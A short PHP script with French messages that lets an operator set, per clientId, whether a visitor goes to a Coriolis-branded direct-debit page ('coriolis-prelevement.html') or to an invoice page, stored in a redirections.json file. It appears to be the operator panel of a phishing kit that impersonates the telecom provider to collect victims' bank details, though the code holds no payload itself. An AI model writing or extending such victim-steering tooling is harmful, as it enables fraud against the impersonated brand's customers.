<?php
header('Content-Type: application/json');
$data = json_decode(file_get_contents('php://input'), true);

if (!$data || empty($data['clientId']) || empty($data['action'])) {
    echo json_encode(['success' => false, 'error' => 'Paramètres manquants']);
    exit;
}

$file = __DIR__ . '/redirections.json';
$redirections = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($redirections)) $redirections = [];

foreach ($redirections as &$r) {
    if ($r['clientId'] === $data['clientId']) {
        if ($data['action'] === 'valid') {
            $r['status'] = 'redirige';
            $r['destinationUrl'] = '/coriolis-prelevement.html';
        } elseif ($data['action'] === 'refus') {
            $r['status'] = 'refuse';
            $r['destinationUrl'] = '/facture.html';
        }
        break;
    }
}

file_put_contents($file, json_encode($redirections, JSON_PRETTY_PRINT));
echo json_encode(['success' => true]);